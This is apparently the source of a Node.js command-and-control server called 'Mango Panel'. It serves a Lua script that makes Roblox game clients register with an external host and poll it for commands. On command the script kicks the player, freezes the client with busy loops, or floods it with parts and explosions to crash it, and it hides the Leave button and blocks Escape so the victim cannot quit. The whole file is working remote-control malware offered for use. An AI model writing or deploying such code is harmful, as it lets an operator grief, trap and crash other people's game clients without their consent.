const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const players = {};

app.get('/api/register', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).send('Username required');

    if (!players[username]) {
        players[username] = {
            command: null,
            lagActive: false,
            crashActive: false
        };
    }
    res.send('OK');
});

app.get('/api/players', (req, res) => {
    const list = Object.keys(players).map(name => ({
        username: name,
        lagActive: players[name].lagActive || false,
        crashActive: players[name].crashActive || false
    }));
    res.json(list);
});

app.post('/api/command', (req, res) => {
    const { username, command, value } = req.body;

    if (!username || !command) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    if (!players[username]) {
        return res.status(404).json({ error: 'Player not found' });
    }

    players[username].command = command;

    if (command === 'lag' && value !== undefined) {
        players[username].lagActive = value;
    }

    if (command === 'crash') {
        players[username].crashActive = value !== undefined ? value : true;
    }

    res.json({ success: true });
});

app.get('/api/get_commands', (req, res) => {
    const username = req.query.username;

    if (!username || !players[username]) {
        return res.send('');
    }

    const cmd = players[username].command || '';
    players[username].command = null;
    res.send(cmd);
});

app.get('/api/get_exec_script', (req, res) => {
    const script = `
local s = "https://crasher-panel.onrender.com"
_G.ToozeServer = s

local p = game.Players.LocalPlayer
if not p then return end

local R = game:GetService("RunService")
local W = game:GetService("Workspace")
local L = game:GetService("Lighting")
local C = game:GetService("CoreGui")
local A = game:GetService("ContextActionService")

local state = {
    lag = false,
    crash = false,
    conns = {}
}

local function reg()
    pcall(function()
        game:HttpGet(s .. "/api/register?username=" .. p.Name)
    end)
end

-- Anti-Leave
local function blockLeave()
    local rg = C:FindFirstChild("RobloxGui")
    if rg then
        local lb = rg:FindFirstChild("LeaveButton")
        if lb then
            lb.Visible = false
            lb.Active = false
            lb.Selectable = false
        end
    end
    A:BindAction("anti", function()
        return Enum.ContextActionResult.Sink
    end, false, Enum.KeyCode.Escape)
end

local function unblockLeave()
    A:UnbindAction("anti")
    local rg = C:FindFirstChild("RobloxGui")
    if rg then
        local lb = rg:FindFirstChild("LeaveButton")
        if lb then
            lb.Visible = true
            lb.Active = true
            lb.Selectable = true
        end
    end
end

-- Lag
local function startLag()
    if state.lag then return end
    state.lag = true

    local c = R.RenderStepped:Connect(function()
        while state.lag do
            local t = os.clock()
            while os.clock() - t < 0.99 do end
            task.wait()
        end
    end)
    table.insert(state.conns, c)
end

local function stopLag()
    state.lag = false
    for _, c in ipairs(state.conns) do
        pcall(c.Disconnect, c)
    end
    state.conns = {}
end

-- Crash
local function startCrash()
    if state.crash then return end
    state.crash = true
    blockLeave()

    task.spawn(function()
        for i = 1, 10000 do
            if not state.crash then break end
            local pt = Instance.new("Part")
            pt.Size = Vector3.new(50, 50, 50)
            pt.CFrame = CFrame.new(
                math.random(-5000, 5000),
                math.random(0, 5000),
                math.random(-5000, 5000)
            )
            pt.Anchored = true
            pt.Material = Enum.Material.Neon
            pt.Parent = W
            if i % 100 == 0 then task.wait() end
        end
    end)

    task.spawn(function()
        while state.crash do
            for i = 1, 100000 do
                local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
                for j = 1, 100 do
                    local __ = _ * j / (j + 1)
                end
            end
            task.wait()
        end
    end)

    local c = R.RenderStepped:Connect(function()
        while state.crash do
            local t = os.clock()
            while os.clock() - t < 0.99 do end
            task.wait()
        end
    end)
    table.insert(state.conns, c)

    task.spawn(function()
        while state.crash do
            for i = 1, 50 do
                local e = Instance.new("Explosion")
                e.Position = Vector3.new(
                    math.random(-2000, 2000),
                    math.random(0, 500),
                    math.random(-2000, 2000)
                )
                e.BlastRadius = 100
                e.BlastPressure = 1000000
                e.Parent = W
            end
            task.wait(0.01)
        end
    end)

    task.spawn(function()
        while state.crash do
            L.Brightness = math.random()
            L.ClockTime = math.random(0, 24)
            L.FogEnd = math.random(0, 1000)
            L.OutdoorAmbient = Color3.fromRGB(
                math.random(0, 255),
                math.random(0, 255),
                math.random(0, 255)
            )
            task.wait(0.01)
        end
    end)
end

local function stopCrash()
    state.crash = false
    unblockLeave()

    for _, c in ipairs(state.conns) do
        pcall(c.Disconnect, c)
    end
    state.conns = {}

    pcall(function()
        for _, v in pairs(W:GetChildren()) do
            if v:IsA("Part") and v.Size == Vector3.new(50, 50, 50) and v.Material == Enum.Material.Neon then
                v:Destroy()
            end
        end
    end)
end

local function check()
    local ok, cmd = pcall(function()
        return game:HttpGet(s .. "/api/get_commands?username=" .. p.Name)
    end)

    if not ok then return end

    if cmd == "kick" then
        p:Kick("Kicked via Mango Panel")
    elseif cmd == "crash" then
        if state.crash then
            stopCrash()
        else
            startCrash()
        end
    elseif cmd == "lag" then
        if state.lag then
            stopLag()
        else
            startLag()
        end
    end
end

reg()
while task.wait(2) do
    check()
end
    `;

    res.setHeader('Content-Type', 'text/plain');
    res.send(script);
});

app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        players: Object.keys(players).length,
        uptime: process.uptime()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Mango Panel running on port ${PORT}`);
});

app.use((err, req, res, next) => {
    res.status(500).json({ error: 'Internal error' });
});
